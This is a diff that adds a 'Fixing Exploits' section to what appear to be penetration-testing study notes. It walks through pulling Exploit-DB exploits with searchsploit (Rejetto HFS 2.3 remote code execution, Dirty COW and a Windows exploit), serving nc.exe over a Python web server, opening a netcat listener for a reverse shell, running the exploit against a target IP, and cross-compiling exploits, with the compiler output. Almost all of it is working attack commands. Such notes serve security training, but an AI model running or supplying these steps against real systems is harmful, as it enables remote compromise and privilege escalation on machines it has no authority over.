@@ -20,6 +20,56 @@
 ### Searching For Exploits
 
 ### Fixing Exploits
+```
+searchsploit rejetto 2.3
+searchsploit -m 39161
+
+cd ~/Desktop
+cp /usr/share/windows-resources/binaries/nc.exe ./
+python -m SimpleHTTPServer 80
+
+nc -nvlp <port>
+
+vi 39161.py
+Change ip_addr and local_port accordingly for nc listener
+python 39161.py <ip> <port>
+```
+
+```
+sudo apt-get install mingw-w64 gcc
+
+searchsploit -m 9303
+
+Compiling 64-bit version:
+i686-w64-mingw32-gcc 9303.c -o exploit
+--> -rwxr-xr-x 1 kali kali 230609 Jan  5 00:49 exploit.exe
+
+file exploit.exe
+exploit.exe: PE32 executable (console) Intel 80386, for MS Windows, 17 sections
+
+Compiling 32-bit version:
+i686-w64-mingw32-gcc 9303.c -o exploit_32 -lws2_32
+--> -rwxr-xr-x 1 kali kali 230609 Jan  5 00:51 exploit_32.exe
+
+file exploit_32.exe 
+exploit_32.exe: PE32 executable (console) Intel 80386, for MS Windows, 17 sections
+```
+- Windows cross-compilation example (https://www.exploit-db.com/exploits/9303)
+  - Use 32-bit if unsure of target's architecture.
+
+```
+searchsploit -m 40839
+
+gcc -pthread 40839.c -o dirty -lcrypt
+--> -rwxr-xr-x 1 kali kali 17512 Jan  5 00:56 dirty
+
+file dirty         
+dirty: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=831f9c59a2d3c829841c3f34979bd09c94104b21, for GNU/Linux 3.2.0, not stripped
+```  
+- Linux compilation example
+  - Specific compilation instructions given
+
+- https://github.com/offensive-security/exploitdb-bin-sploits
 
 ### Bind and Reverse Shells
 ```
